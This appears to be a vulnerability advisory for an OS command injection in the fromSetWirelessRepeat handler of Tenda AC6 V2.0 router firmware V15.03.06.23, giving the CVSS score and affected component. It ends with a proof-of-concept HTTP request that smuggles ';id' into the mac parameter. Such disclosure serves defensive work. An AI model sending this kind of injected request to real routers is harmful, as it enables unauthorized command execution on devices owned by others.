## Tenda AC6V2 fromSetWirelessRepeat Command Injection via mac/ssid 

### Title

```
Tenda AC6 V2.0 fromSetWirelessRepeat Command Injection via mac/ssid
```

### Vendor / Product / Version

```
Tenda / AC6 V2.0 (AC1206) / Firmware V15.03.06.23
```

### Component

```
/bin/httpd — fromSetWirelessRepeat handler (0x4c28c4)
```

### CVSS 3.1

```
8.8 (High) CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
```

### Description

```
An OS command injection vulnerability exists in the fromSetWirelessRepeat
function (0x4c28c4) of /bin/httpd in Tenda AC6 V2.0 firmware V15.03.06.23.

The function reads multiple parameters (mac, ssid, and 10 others) via
websGetVar() and passes them to doSystemCmd("rm %s"), which calls system().

CVE-2024-0930 targets the same function name on AC10U but describes a
stack-based buffer overflow. This vulnerability is a command injection —
a different vulnerability type on a different device model.
```

### Proof of Concept

```http
POST /goform/WifiExtraSet HTTP/1.1
Host: 192.168.0.1
Content-Type: application/x-www-form-urlencoded
Cookie: <valid_session>

mac=;id&wifi_chkHz=0&wl_mode=0&ssid=test
```

### Credit

```
Discovered by ST4R using FirmRec automated symbolic execution engine.
```

